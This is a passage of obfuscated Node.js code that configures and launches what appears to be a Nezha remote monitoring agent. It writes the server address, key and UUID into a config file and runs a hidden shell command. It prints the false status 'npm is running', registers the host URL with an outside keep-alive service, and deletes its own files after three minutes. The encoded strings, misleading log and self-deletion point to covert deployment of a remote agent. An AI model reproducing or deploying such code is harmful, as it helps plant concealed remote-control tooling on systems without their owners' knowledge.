_0x3db03c=NEZHA_SERVER[_0x1c67e0(0x244)](':')?NEZHA_SERVER[_0x1c67e0(0x1e8)](':')['pop']():'',_0x1fe059=_0x3f8fe7[_0x1c67e0(0x244)](_0x3db03c)?_0x1c67e0(0x213):'false',_0x2f9803=_0x1c67e0(0x226)+NEZHA_KEY+_0x1c67e0(0x1bc)+NEZHA_SERVER+_0x1c67e0(0x212)+_0x1fe059+_0x1c67e0(0x1c8)+UUID;fs[_0x1c67e0(0x214)](_0x1c67e0(0x224),_0x2f9803);}_0x2af271=_0x1c67e0(0x1ba);}else return;}try{exec(_0x2af271,{'shell':_0x1c67e0(0x1ad)},_0x218e70=>{const _0x27c93d=_0x1c67e0;if(_0x218e70)console[_0x27c93d(0x1d4)](_0x27c93d(0x1fb),_0x218e70);else console[_0x27c93d(0x1b8)]('npm\x20is\x20running');});}catch(_0x5c38f0){console[_0x1c67e0(0x1d4)]('error:\x20'+_0x5c38f0);}};async function addAccessTask(){const _0x192ead=_0x44d7e6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xdf4f03=_0x192ead(0x1c3)+DOMAIN+'/'+SUB_PATH;try{const _0xd8f508=await httpPost(_0x192ead(0x1d5),{'url':_0xdf4f03});console[_0x192ead(0x1b8)](_0x192ead(0x1e1));}catch(_0x2bd203){}}const delFiles=()=>{const _0x3702bf=_0x44d7e6;[_0x3702bf(0x20b),_0x3702bf(0x224)][_0x3702bf(0x1ec)](_0xab903c=>fs['unlink'](_0xab903c,()=>{}));};httpServer[_0x44d7e6(0x1c4)](PORT,async()=>{const _0x31a0ab=_0x44d7e6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x31a0ab(0x1b8)](_0x31a0ab(0x22e)+PORT);});
